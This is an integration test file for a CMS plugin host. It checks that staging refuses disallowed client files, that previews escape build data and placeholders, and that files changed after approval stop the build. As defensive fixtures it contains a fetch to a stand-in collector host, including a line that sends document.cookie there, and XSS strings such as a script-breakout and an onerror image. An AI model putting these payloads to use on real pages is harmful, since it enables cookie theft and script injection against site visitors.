// SPDX-License-Identifier: MPL-2.0

/**
 * #1729 — a runtime-installed plugin puts client files on pages and
 * withholds a module (docs/dev/external-plugin-brokers.md §6.7, decision
 * Q4 B), end to end on a real Postgres and the real Deno sandbox: staged,
 * approved by an Owner, activated, then rendered in the editor preview.
 *
 * - Staging refuses a client file the browser rule set refuses (a fetch to
 *   a site the grant does not name, CSS loading a third-party URL).
 * - The preview carries the reviewed bytes, the build data as an escaped
 *   data block, and a withheld module behind the declared placeholder with
 *   its text escaped; the embed itself only inside the inert template.
 * - The grant's origin reaches the build's CSP sources.
 * - A file changed after approval: the artifact digest no longer matches,
 *   so the plugin's build-data call is refused and nothing new ships.
 */

import { afterAll, beforeAll, expect, it } from "bun:test";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  activateApprovedExternalPlugin,
  bootstrap,
  collectBuildAssets,
  MAIN_RENDER,
  resetPluginHost,
} from "@caelo-cms/plugin-host";
import { DatabaseAdapter, execute, OperationRegistry } from "@caelo-cms/query-api";
import { sql } from "drizzle-orm";
import { lockPluginRow } from "../locks.js";
import { registerAdminOps } from "../register.js";

let adapter: DatabaseAdapter;
let pluginsRoot: string;
const registry = new OperationRegistry();
const system = {
  actorId: "00000000-0000-0000-0000-00000000ffff",
  actorKind: "system" as const,
  requestId: "external-client-assets-test",
};
const SLUG = "asset-probe";
const PFX = "t1729ca";

const PROBE_JS =
  'document.documentElement.setAttribute("data-probe", JSON.parse(document.querySelector(\'script[data-caelo-plugin-data="asset-probe"]\').textContent).greeting); fetch("https://api.example.com/ping");';

const manifest = {
  slug: SLUG,
  version: "1.0.0",
  tier: 2,
  schema: {},
  operations: ["data", "gate"],
  clientFiles: { "probe.js": PROBE_JS, "probe.css": ".probe-held{opacity:.9}" },
  hasBuildData: true,
  hasDeferrals: true,
  deferralPlaceholders: {
    held: {
      html: '<div class="probe-held"><p>Withheld until you allow {{label}}.</p><button type="button" data-probe-allow="{{key}}">Allow</button></div>',
      css: ".probe-held{border:1px dashed}",
    },
  },
  requestedCapabilities: ["client_assets"],
  capabilityReasons: { client_assets: "Show the probe's banner and hold its embeds" },
  capabilityConstraints: { client_assets: { origins: { connect: ["https://api.example.com"] } } },
};
const source = `export default {slug:"${SLUG}",version:"1.0.0",tier:2,
  buildDataOperation: "data",
  deferralsOperation: "gate",
  operations:{
    data: async () => ({ data: { greeting: "</script><script>alert(1)</script>" } }),
    gate: async (ctx, args) => ({
      deferrals: Object.fromEntries(args.modules
        .filter((m) => m.html.includes("youtube.com"))
        .map((m) => [m.moduleId, { reason: "marketing", placeholderModuleSlug: "${PFX}-none",
          placeholder: { name: "held", values: { label: "<img src=x onerror=alert(1)>", key: "marketing" } } }])),
    }),
  }};`;

beforeAll(async () => {
  if (!process.env.ADMIN_DATABASE_URL || !process.env.PUBLIC_ADMIN_DATABASE_URL)
    throw new Error("DB URLs required");
  adapter = new DatabaseAdapter({
    adminDatabaseUrl: process.env.ADMIN_DATABASE_URL,
    publicDatabaseUrl: process.env.PUBLIC_ADMIN_DATABASE_URL,
  });
  registerAdminOps(registry);
  await cleanup();
  pluginsRoot = await mkdtemp(join(tmpdir(), "caelo-client-assets-test-"));
  await bootstrap({
    infra: { adapter, registry, lockPluginRow },
    pluginsRoot,
    systemActorId: system.actorId,
  });
});
afterAll(async () => {
  resetPluginHost();
  await cleanup();
  await rm(pluginsRoot, { recursive: true, force: true });
  await adapter.close();
});

/** The rows this file creates, which outlive the per-file reset. */
const cleanup = () =>
  adapter.withAdminTransaction(system, async (tx) => {
    await tx.execute(sql.raw("SET LOCAL caelo.actor_kind = 'system'"));
    await tx.execute(
      sql.raw(
        `DELETE FROM page_modules WHERE page_id IN (SELECT id FROM pages WHERE slug LIKE '${PFX}-%')`,
      ),
    );
    await tx.execute(sql.raw(`DELETE FROM pages WHERE slug LIKE '${PFX}-%'`));
    await tx.execute(sql.raw(`DELETE FROM modules WHERE slug LIKE '%${PFX}%'`));
    await tx.execute(
      sql.raw(
        `DELETE FROM template_blocks WHERE template_id IN (SELECT id FROM templates WHERE slug LIKE '${PFX}-%')`,
      ),
    );
    await tx.execute(sql.raw(`DELETE FROM templates WHERE slug LIKE '${PFX}-%'`));
    await tx.execute(sql.raw(`DELETE FROM layouts WHERE slug LIKE '${PFX}-%'`));
  });

async function call(
  name: string,
  input: unknown,
  ctx = system as { actorId: string; actorKind: "system" | "human" | "ai"; requestId: string },
) {
  const result = await execute(registry, adapter, ctx, name, input);
  if (!result.ok) throw new Error(`${name}: ${JSON.stringify(result.error)}`);
  return result.value;
}

async function owner() {
  const id = crypto.randomUUID();
  await adapter.withAdminTransaction(system, async (tx) => {
    await tx.execute(
      sql`INSERT INTO actors (id,kind,display_name) VALUES (${id}::uuid,'human','owner')`,
    );
    await tx.execute(
      sql`INSERT INTO users (id,email,password_hash) VALUES (${id}::uuid,${`${id}@example.test`},'test-only')`,
    );
    await tx.execute(
      sql`INSERT INTO user_roles (user_id,role_id) SELECT ${id}::uuid,id FROM roles WHERE name='owner'`,
    );
  });
  return { ...system, actorId: id, actorKind: "human" as const };
}

/** Stage, approve as an Owner and activate the probe. */
async function install(): Promise<void> {
  const staged = (await call("plugins.stage_installation", { manifest, source })) as {
    installationId: string;
    artifactDigest: string;
  };
  const review = (await call("plugins.list_installations", {})) as {
    installations: { id: string; currentStateDigest: string }[];
  };
  const item = review.installations.find((row) => row.id === staged.installationId);
  if (!item) throw new Error("review missing");
  await call(
    "plugins.approve_installation",
    {
      installationId: staged.installationId,
      artifactDigest: staged.artifactDigest,
      expectedStateDigest: item.currentStateDigest,
      capabilities: manifest.requestedCapabilities,
    },
    await owner(),
  );
  const loaded = await activateApprovedExternalPlugin(staged.installationId);
  if (!loaded.loaded) throw new Error(`activation failed: ${loaded.reason}`);
}

/** A page with one plain module and one that embeds a third party. */
async function page(): Promise<string> {
  const { layoutId } = (await call("layouts.create", {
    slug: `${PFX}-layout`,
    displayName: "T1729 assets layout",
    html: '<body><caelo-slot name="content"></caelo-slot></body>',
    css: "",
    blocks: [{ name: "content", displayName: "Content", position: 0 }],
  })) as { layoutId: string };
  const { templateId } = (await call("templates.create", {
    pageType: "home",
    slug: `${PFX}-tpl`,
    displayName: "T1729 assets",
    html: '<!doctype html><html><head><title>T</title></head><body><caelo-slot name="content">_</caelo-slot></body></html>',
    css: "",
    layoutId,
  })) as { templateId: string };
  await call("template_blocks.set", {
    templateId,
    blocks: [{ name: "content", displayName: "Content", position: 0 }],
  });
  const { pageId } = (await call("pages.build_page", {
    page: { slug: `${PFX}-page`, title: "Assets", templateId, status: "draft", pageType: "home" },
    modules: [
      {
        blockName: "content",
        displayName: `${PFX} Intro`,
        description: "A plain introduction.",
        kind: "content",
        html: "<p>Plain intro</p>",
        fields: [],
        content: { source: "inline", values: {} },
      },
      {
        blockName: "content",
        displayName: `${PFX} Video`,
        description: "A video from a third party.",
        kind: "content",
        html: '<iframe src="https://www.youtube.com/embed/x" title="Video"></iframe>',
        fields: [],
        content: { source: "inline", values: {} },
      },
    ],
  })) as { pageId: string };
  return pageId;
}

it("staging refuses client files the browser rule set refuses", async () => {
  const refused = async (patch: Record<string, unknown>) => {
    const r = await execute(registry, adapter, system, "plugins.stage_installation", {
      manifest: { ...manifest, ...patch },
      source,
    });
    return r.ok ? null : JSON.stringify(r.error);
  };
  expect(
    await refused({
      clientFiles: { "probe.js": 'fetch("https://collector.example/steal")' },
    }),
  ).toContain("collector.example");
  expect(
    await refused({
      clientFiles: {
        "probe.js": PROBE_JS,
        "probe.css": "@import url(https://fonts.example/a.css);",
      },
    }),
  ).toContain("@import");
  expect(
    await refused({
      deferralPlaceholders: { held: { html: '<img src="https://t.example/p.gif">', css: "" } },
    }),
  ).toContain("element <img>");
}, 120_000);

it("the preview carries the reviewed files, the escaped data and the declared placeholder", async () => {
  await install();
  const pageId = await page();
  const preview = (await call("pages.render_preview", { pageId })) as {
    html: string;
    pluginFailures: { slug: string; reason: string }[];
  };
  expect(preview.pluginFailures).toEqual([]);
  // The reviewed bytes, inlined as the preview does.
  expect(preview.html).toContain(PROBE_JS);
  // The build data: escaped, so it cannot end its block.
  expect(preview.html).toContain(
    `<script type="application/json" data-caelo-plugin-data="${SLUG}">{"greeting":"\\u003c/script>\\u003cscript>alert(1)\\u003c/script>"}</script>`,
  );
  expect(preview.html).not.toContain("<script>alert(1)");
  // The withheld embed: the declared placeholder with escaped text, the
  // iframe only inside the inert template.
  expect(preview.html).toContain(
    '<p>Withheld until you allow &lt;img src=x onerror=alert(1)&gt;.</p><button type="button" data-probe-allow="marketing">Allow</button>',
  );
  expect(preview.html).not.toContain("<img src=x");
  expect(preview.html.indexOf("youtube.com/embed")).toBeGreaterThan(
    preview.html.indexOf("<template data-caelo-deferred-content>"),
  );
  expect(preview.html).toContain(">Plain intro</p>");

  // The grant's origin is the plugin's CSP source in a build.
  const assets = await collectBuildAssets(MAIN_RENDER);
  expect(assets.find((a) => a.pluginSlug === SLUG && a.kind === "css")?.content).toBe(
    ".probe-held{opacity:.9}",
  );
  const csp = assets.find((a) => a.pluginSlug === SLUG && a.kind === "csp");
  expect(JSON.parse(csp?.content ?? "{}")).toEqual({
    origins: { connect: ["https://api.example.com"] },
  });
}, 180_000);

it("a client file changed after approval no longer matches the approved artifact", async () => {
  await adapter.withAdminTransaction(system, async (tx) => {
    await tx.execute(sql.raw("SET LOCAL caelo.actor_kind = 'system'"));
    await tx.execute(sql`
      UPDATE plugins
         SET manifest_json = jsonb_set(manifest_json, '{clientFiles,probe.js}', '"fetch(\\"https://collector.example/\\" + document.cookie)"'::jsonb)
       WHERE slug = ${SLUG}
    `);
  });
  // The build-data call checks the approval first: the running digest is
  // no longer the approved one, so the build stops instead of shipping.
  expect(collectBuildAssets(MAIN_RENDER)).rejects.toThrow(/ExternalPluginApprovalChanged/);
}, 120_000);
